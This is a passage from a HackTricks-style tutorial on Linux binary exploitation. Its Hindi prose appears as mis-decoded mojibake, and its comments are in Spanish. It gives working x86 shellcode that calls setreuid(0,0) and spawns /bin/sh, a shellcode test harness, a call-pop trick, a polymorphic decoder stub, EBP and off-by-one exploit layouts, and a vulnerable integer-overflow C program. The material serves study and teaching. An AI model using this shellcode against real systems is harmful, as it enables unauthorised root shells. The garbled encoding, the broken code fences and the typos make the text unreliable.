# рд▓рд┐рдирдХреНрд╕ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯрд┐рдВрдЧ (рдореВрд▓) (SPA)

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>

## **1.рд╕реНрдЯреИрдХ рдУрд╡рд░рдлреНрд▓реЛ**

> рдмрдлрд░ рдУрд╡рд░рдлреНрд▓реЛ, рдмрдлрд░ рдУрд╡рд░рд░рди, рд╕реНрдЯреИрдХ рдУрд╡рд░рд░рди, рд╕реНрдЯреИрдХ рд╕реНрдореИрд╢рд┐рдВрдЧ

рд╕реЗрдЧрдореЗрдВрдЯреЗрд╢рди рдлреЙрд▓реНрдЯ рдпрд╛ рд╕реЗрдЧрдореЗрдВрдЯ рд╡рд╛рдпреЛрд▓реЗрд╢рди: рдЬрдм рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдирд╣реАрдВ рдХрд┐рдП рдЧрдП рдореЗрдореЛрд░реА рдкрддреЗ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХреА рдЬрд╛рддреА рд╣реИред

рдХрд┐рд╕реА рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЗ рднреАрддрд░ рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### рд╕рд┐рд╕реНрдЯрдо\_execve рдХреЛ рдХреЙрд▓ рдХрд░реЗрдВ

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

рдЕрд╕реНрддрд┐рддреНрд╡ рдХреА kernel рдЕрдВрддрд░реНрд░реБрдкреНрддрд┐рдпрд╛рдБ рджреЗрдЦреЗрдВ: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep тАЬ\_\_NR\_тАЭ

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(тАЬ/bin/shтАЭ, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; eax рдХреЛ рд╕рд╛рдл рдХрд░реЗрдВ\
xor ebx, ebx ; ebx = 0 рдХреНрдпреЛрдВрдХрд┐ рдХреЛрдИ рдЖрд░реНрдЧреНрдпреВрдореЗрдВрдЯ рдкрд╛рд╕ рдирд╣реАрдВ рдХрд░рдирд╛ рд╣реИ\
mov al, 0x01 ; eax = 1 тАФ> \_\_NR\_exit 1\
int 0x80 ; рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рдХреЛ рдЪрд▓рд╛рдПрдВ

**nasm -f elf assembly.asm** тАФ> рд╣рдореЗрдВ рдПрдХ .o рдлрд╝рд╛рдЗрд▓ рджреЗрдЧрд╛\
**ld assembly.o -o shellcodeout** тАФ> рд╣рдореЗрдВ рдПрдХ рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рджреЗрдЧрд╛ рдЬрд┐рд╕рдореЗрдВ рдЕрд╕реЗрдореНрдмрд▓реА рдХреЛрдб рд╣реЛрдЧрд╛ рдФрд░ рд╣рдо рдУрдкрдХреЛрдбреНрд╕ рдХреЛ **objdump** рдХреЗ рд╕рд╛рде рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ\
**objdump -d -Mintel ./shellcodeout** тАФ> рдпрд╣ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдпрд╣ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рд╣рдорд╛рд░рд╛ рд╢реЗрд▓рдХреЛрдб рд╣реИ рдФрд░ рдУрдкрдХреЛрдбреНрд╕ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП

**рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рд╢реЗрд▓рдХреЛрдб рдХрд╛рдо рдХрд░ рд░рд╣рд╛ рд╣реИ**
```
char shellcode[] = тАЬ\x31\xc0\x31\xdb\xb0\x01\xcd\x80тАЭ

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">тАЛ</span>
```
рдпрд╣ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рд╣реЛ рд░рд╣реЗ рд╣реИрдВ, рдкрд┐рдЫрд▓реЗ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ рдХрдВрдкрд╛рдЗрд▓ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдФрд░ рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ **strace ./рдХрдВрдкрд╛рдЗрд▓_рдХрд┐рдпрд╛_рдЧрдпрд╛_рдкреНрд░реЛрдЧреНрд░рд╛рдо** рдореЗрдВ рджрд┐рдЦрдирд╛ рдЪрд╛рд╣рд┐рдПред

рд╢реИрд▓рдХреЛрдб рдмрдирд╛рддреЗ рд╕рдордп рдПрдХ рдЪрд╛рд▓ рд▓рд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдкрд╣рд▓рд╛ рдирд┐рд░реНрджреЗрд╢ рдПрдХ рдХреЙрд▓ рдХреЛ рдЬрдореНрдк рдХрд░рддрд╛ рд╣реИред рдХреЙрд▓ рдореВрд▓ рдХреЛрдб рдХреЛ рдмреБрд▓рд╛рддрд╛ рд╣реИ рдФрд░ рд╕рд╛рде рд╣реА EIP рдХреЛ рд╕реНрдЯреИрдХ рдореЗрдВ рдбрд╛рд▓рддрд╛ рд╣реИред рдХреЙрд▓ рдХреЗ рдирд┐рд░реНрджреЗрд╢ рдХреЗ рдмрд╛рдж, рд╣рдордиреЗ рдЙрд╕ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдбрд╛рд▓ рджрд┐рдпрд╛ рд╣реИ рдЬрд┐рд╕рдХреА рд╣рдореЗрдВ рдЖрд╡рд╢реНрдпрдХрддрд╛ рдереА, рдЗрд╕рд▓рд┐рдП рдЙрд╕ EIP рдХреЗ рд╕рд╛рде рд╣рдо рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдирд┐рд╢рд╛рдирд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╕рд╛рде рд╣реА рдХреЛрдб рдХреЛ рдЬрд╛рд░реА рд░рдЦ рд╕рдХрддреЗ рд╣реИрдВред

рдЙрджрд╛рд╣рд░рдг **рдЪрд╛рд▓ (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al ├║ltimo call
popl                %esi                                       ; Guardamos en ese la direcci├│n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=тАЬ/bin/shтАЭ
leal                 0x8(%esi), %ecx      ; arg[2] = {тАЬ/bin/shтАЭ, тАЬ0тАЭ}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(тАЬ/bin/shтАЭ, [тАЬ/bin/shтАЭ, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci├│n
.string             \тАЭ/bin/sh\тАЭ                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">тАЛ</span>
```
**Stack рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ EJ(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; тАЬ\0тАЭ
push               dword 0x68732f2f ; тАЬ//shтАЭ
push               dword 0x6e69622f; тАЬ/binтАЭ
mov                ebx, esp                     ; arg1 = тАЬ/bin//sh\0тАЭ
push               eax                             ; Null -> args[1]
push               ebx                             ; тАЬ/bin/sh\0тАЭ -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(тАЬ/bin/shтАЭ, args[тАЬ/bin/shтАЭ, тАЬNULLтАЭ], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut├│ fabs
тАж
```
**рдЕрдВрдбрд╛ рд╣рдВрдЯрд░:**

рдпрд╣ рдПрдХ рдЫреЛрдЯрд╛ рд╕рд╛ рдХреЛрдб рд╣реИ рдЬреЛ рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реЗ рдЬреБрдбрд╝реА рдореЗрдореЛрд░реА рдкреЗрдЬреЛрдВ рдХреЛ рджреМрдбрд╝рддрд╛ рд╣реИ рдФрд░ рд╡рд╣рд╛рдВ рд╕рдВрдЧреНрд░рд╣рд┐рдд рд╢реЗрд▓рдХреЛрдб рдХреА рдЦреЛрдЬ рдХрд░рддрд╛ рд╣реИ (рд╢реЗрд▓рдХреЛрдб рдореЗрдВ рдбрд╛рд▓реА рдЧрдИ рдХреЛрдИ рд╕рд┐рдЧреНрдиреЗрдЪрд░ рдЦреЛрдЬрддрд╛ рд╣реИ)ред рдХреЛрдб рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЗрд╡рд▓ рдереЛрдбрд╝реА рд╕реА рдЬрдЧрд╣ рд╣реЛрдиреЗ рдХреЗ рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдЙрдкрдпреБрдХреНрддред

**рдкреЙрд▓рд┐рдореЙрд░реНрдлрд┐рдХ рд╢реЗрд▓рдХреЛрдб**

рдпреЗ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рд╢реЗрд▓реНрд╕ рд╣реИрдВ рдЬрд┐рдирдореЗрдВ рдПрдХ рдЫреЛрдЯрд╛ рд╕рд╛ рдХреЛрдб рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рдЙрдиреНрд╣реЗрдВ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЙрд╕ рдкрд░ рдЬрд╛рддрд╛ рд╣реИ, рдХреЙрд▓-рдкреЙрдк рдХреЗ рдЪрд╛рд▓ рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП, рдпрд╣ рдПрдХ **рд╕реАрдЬрд╝рд░ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХрд╛ рдЙрджрд╛рд╣рд░рдг** рд╣реЛрдЧрд╛:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer├б)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu├н va el shellcode
```
1. **рдлреНрд░реЗрдо рдкреЙрдЗрдВрдЯрд░ (EBP) рдХрд╛ рд╣рдорд▓рд╛**

рдпрд╣ рдЙрдкрдпреБрдХреНрдд рд╣реИ рдЬрдм рд╣рдо EBP рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди EIP рдХреЛ рдирд╣реАрдВред

рдПрдХ рдлрд╝рдВрдХреНрд╢рди рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рддреЗ рд╕рдордп рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЕрд╕реЗрдореНрдмрд▓реА рдХреЛрдб рдЪрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```
movl               %ebp, %esp
popl                %ebp
ret
```
рдЗрд╕ рддрд░рд╣, рдПрдХ рдлрд╝рдВрдХреНрд╢рди (fvuln) рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рддреЗ рд╕рдордп EBP рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рдХрд┐рд╕реА рдЕрдиреНрдп рдлрд╝рдВрдХреНрд╢рди рджреНрд╡рд╛рд░рд╛ рдмреБрд▓рд╛рдИ рдЧрдИ рд╣реИ, рдЬрдм рд╡рд╣ рдлрд╝рдВрдХреНрд╢рди рдЬреЛ fvuln рдХреЛ рдмреБрд▓рд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рд╕рдорд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдЙрд╕рдХрд╛ EIP рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

fvuln рдореЗрдВ рдПрдХ рдирдХрд▓реА EBP рдбрд╛рд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдПрдХ рд╕реНрдерд╛рди рдХреА рдУрд░ рдкрд╣реБрдВрдЪрддрд╛ рд╣реИ рдЬрд╣рд╛рдВ рд╢реЗрд▓рдХреЛрдб рдХрд╛ рдкрддрд╛ рд╣реИ + 4 (рдкреЙрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП 4 рдЬреЛрдбрд╝рдирд╛ рд╣реЛрдЧрд╛)ред рдЗрд╕ рддрд░рд╣, рдлрд╝рдВрдХреНрд╢рди рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рддреЗ рд╕рдордп, ESP рдореЗрдВ &(\&Shellcode)+4 рдХрд╛ рдорд╛рди рдбрд╛рд▓ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдкреЙрдк рдХреЗ рд╕рд╛рде ESP рд╕реЗ 4 рдХрдо рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдпрд╣ рд╢реЗрд▓рдХреЛрдб рдХреЗ рдкрддреЗ рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░реЗрдЧрд╛ рдЬрдм рд░рд┐рдЯ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

**рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ:**\
\&Shellcode + "AAAA" + SHELLCODE + relleno + &(\&Shellcode)+4

**рдСрдл-рдмрд╛рдИ-рд╡рди рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ**\
рдХреЗрд╡рд▓ EBP рдХреЗ рд╕рдмрд╕реЗ рдХрдо рдорд╣рддреНрд╡рдкреВрд░реНрдг рдмрд╛рдЗрдЯ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреА рдЬрд╛рддреА рд╣реИред рдПрдХ рдкреВрд░реНрд╡рд╡рдд рдЖрдХреНрд░рдордг рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреИрд╕реЗ рдкрд┐рдЫрд▓реЗ, рд▓реЗрдХрд┐рди рд╢реЗрд▓рдХреЛрдб рдХрд╛ рдкрддрд╛ рд░рдЦрдиреЗ рд╡рд╛рд▓реА рдореЗрдореЛрд░реА рдХреЛ EBP рдХреЗ рд╕рд╛рде рдкрд╣рд▓реЗ 3 рдмрд╛рдЗрдЯ рд╕рд╛рдЭрд╛ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред
```
**Ret2PopRet**
```
**Murat Technique**

рдЕрдЧрд░ рд╣рдо рдкрд╣рд▓реЗ рддрд░реНрдХ рдкрд░ рдирд┐рдпрдВрддреНрд░рдг рдирд╣реАрдВ рд░рдЦрддреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди рджреВрд╕рд░реЗ рдпрд╛ рддреАрд╕рд░реЗ рдкрд░ рд╣реИ, рддреЛ рд╣рдо EIP рдХреЛ рдкреЙрдк-рд░реЗрдЯ рдпрд╛ рдкреЙрдк-рдкреЙрдк-рд░реЗрдЯ рдХреЗ рд▓рд┐рдП рдкрддрд╛ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрд┐рд╕реЗ рд╣рдореЗрдВ рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред

рд▓рд┐рдирдХреНрд╕ рдореЗрдВ рд╕рднреА рдкреНрд░реЛрдЧреНрд░рд╛рдо 0xbfffffff рд╕реЗ рдЖрд░рдВрдн рд╣реЛрддреЗ рд╣реИрдВред

рд▓рд┐рдирдХреНрд╕ рдореЗрдВ рдПрдХ рдирдП рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд╕реНрдЯреИрдХ рдХреИрд╕реЗ рдирд┐рд░реНрдорд┐рдд рд╣реЛрддрд╛ рд╣реИ рдХреЛ рджреЗрдЦрдХрд░ рд╣рдо рдПрдХ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рд╡рд┐рдХрд╕рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдПрдХ рдРрд╕реЗ рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдП рдЬрд┐рд╕рдореЗрдВ рдХреЗрд╡рд▓ рдПрдХрдорд╛рддреНрд░ рдЪрд░ рд╢реИрд▓рдХреЛрдб рд╣реЛред рдЗрд╕рдХрд╛ рдкрддрд╛ рддрдм рд▓рдЧрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ: addr = 0xbfffffff - 4 - strlen(NOMBRE\_ejecutable\_completo) - strlen(shellcode)

рдЗрд╕ рддрд░рд╣, рдЪрд░ рд╢реИрд▓рдХреЛрдб рдХреЗ рд╕рд╛рде рдЪрд░ рд╡рд╛рддрд╛рд╡рд░рдг рдХреА рдкрддрд╛ рд▓рдЧрд╛рдИ рдЬрд╛ рд╕рдХрддреА рд╣реИред

рдпрд╣ рдХрд╛рд░рдг рд╣реИ рдХрд┐ execle рдлрд╝рдВрдХреНрд╢рди рдПрдХ рд╡рд╛рддрд╛рд╡рд░рдг рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдХреЗрд╡рд▓ рд╡рд╛рддрд╛рд╡рд░рдг рдЪрд░ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред

**Jump to ESP: Windows Style**

ESP рд╣рдореЗрд╢рд╛ рд╕реНрдЯреИрдХ рдХреА рд╢реБрд░реБрдЖрдд рдХреЛ рдирд┐рд╢рд╛рдирд┐рдд рдХрд░ рд░рд╣рд╛ рд╣реИ, рдЗрд╕ рддрдХрдиреАрдХ рдореЗрдВ EIP рдХреЛ **jmp esp** рдпрд╛ **call esp** рдХреЗ рдПрдХ рдХреЙрд▓ рдХреЗ рдкрддреЗ рд╕реЗ рдмрджрд▓рдиреЗ рдХрд╛ рдХрд╛рдо рд╣реИред рдЗрд╕ рддрд░рд╣, EIP рдХреЗ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХреЗ рдмрд╛рдж рд╢реИрд▓рдХреЛрдб рд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рд╕рд╣реЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ **ret** рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреЗ рдмрд╛рдж ESP рдЕрдЧрд▓реЗ рдкрддреЗ рдХреА рдУрд░ рдирд┐рд╢рд╛рдирд┐рдд рд╣реЛрдЧрд╛, рдЬрд╣рд╛рдВ рд╢реИрд▓рдХреЛрдб рд╕рд╣реЗрдЬрд╛ рдЧрдпрд╛ рд╣реИред

рдЕрдЧрд░ Windows рдпрд╛ Linux рдореЗрдВ ASLR рд╕рдХреНрд░рд┐рдп рдирд╣реАрдВ рд╣реИ рддреЛ **jmp esp** рдпрд╛ **call esp** рдХреЛ рдХрд┐рд╕реА рд╕рд╛рдЭрд╛ рдСрдмреНрдЬреЗрдХреНрдЯ рдореЗрдВ рд╕рд╣реЗрдЬрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред ASLR рд╣реЛрдиреЗ рдХреА рд╕реНрдерд┐рддрд┐ рдореЗрдВ, рд╡реНрдпрдХреНрддрд┐рдЧрдд рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЗ рднреАрддрд░ рдЦреЛрдЬ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИред

рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рд╢реИрд▓рдХреЛрдб рдХреЛ рд╕реНрдЯреИрдХ рдХреЗ рдмреАрдЪ рдореЗрдВ рдирд╣реАрдВ рдбрд╛рд▓рдХрд░ EIP рдХреЗ рдХреЛрд░рдкреНрд╢рди рдХреЗ рдмрд╛рдж рд╢реИрд▓рдХреЛрдб рд░рдЦрдиреЗ рдХреА рдХреНрд╖рдорддрд╛, рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдмреАрдЪ рдореЗрдВ рдЪрд▓рдиреЗ рд╡рд╛рд▓реЗ push рдпрд╛ pop рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХреЛ рдЫреВрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ (рдЬреЛ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд╕реНрдЯреИрдХ рдХреЗ рдмреАрдЪ рдореЗрдВ рд╣реЛ рд╕рдХрддреА рд╣реИ)ред

рдЗрд╕реА рддрд░рд╣, рдпрджрд┐ рд╣рдореЗрдВ рдкрддрд╛ рд╣реИ рдХрд┐ рдПрдХ рдлрд╝рдВрдХреНрд╢рди рд╢реИрд▓рдХреЛрдб рдХреЛ рдХрд╣рд╛рдВ рд╕рд╣реЗрдЬрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рд╣рдо **call eax** рдпрд╛ **jmp eax (ret2eax)** рдХреЛ рдХреЙрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

**рдЗрдВрдЯреАрдЬрд░ рдУрд╡рд░рдлреНрд▓реЛрдЬ**

рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рдУрд╡рд░рдлреНрд▓реЛрдЬ рдЙрддреНрдкрдиреНрди рд╣реЛрддреЗ рд╣реИрдВ рдЬрдм рдПрдХ рдЪрд░рд┐рддреНрд░ рдПрдХ рдЗрддрдиреЗ рдмрдбрд╝реЗ рд╕рдВрдЦреНрдпрд╛ рдХреЛ рд╕рд╣рдиреЗ рдХреЗ рд▓рд┐рдП рддреИрдпрд╛рд░ рдирд╣реАрдВ рд╣реИ, рд╕рдВрднрд╛рд╡рдирд╛ рдПрдХ рдЧрд▓рддреА рдХреЗ рдХрд╛рд░рдг рдЬреИрд╕реЗ рдХрд┐ рдЪрд░рд┐рддреНрд░ рдФрд░ рдЪрд┐рд╣реНрдирд┐рдд рдЪрд░рд┐рддреНрд░ рдХреЗ рдмреАрдЪ рднреНрд░рд╛рдВрддрд┐ рдХреЗ рдХрд╛рд░рдг:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
рдкрд┐рдЫрд▓реЗ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рд╣рдо рджреЗрдЦрддреЗ рд╣реИрдВ рдХрд┐ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреА рджреЛ рдкреИрд░рд╛рдореАрдЯрд░ рдХреА рдЕрдкреЗрдХреНрд╖рд╛ рд╣реИред рдкрд╣рд▓рд╛ рдЕрдЧрд▓реА рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреА рд▓рдВрдмрд╛рдИ рд╣реИ рдФрд░ рджреВрд╕рд░рд╛ рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╣реИред

рдЕрдЧрд░ рд╣рдо рдкрд╣рд▓реЗ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рдирдХрд╛рд░рд╛рддреНрдордХ рд╕рдВрдЦреНрдпрд╛ рджреЗрддреЗ рд╣реИрдВ рддреЛ рдпрд╣ рдирд┐рдХрд▓реЗрдЧрд╛ рдХрд┐ len < 256 рдФрд░ рд╣рдо рдЙрд╕ рдлрд╝рд┐рд▓реНрдЯрд░ рдХреЛ рдкрд╛рд░ рдХрд░реЗрдВрдЧреЗ, рдФрд░ рд╕рд╛рде рд╣реА strlen(buffer) рднреА l рд╕реЗ рдХрдо рд╣реЛрдЧрд╛, рдХреНрдпреЛрдВрдХрд┐ l unsigned int рд╣реИ рдФрд░ рдмрд╣реБрдд рдмрдбрд╝рд╛ рд╣реЛрдЧрд╛ред

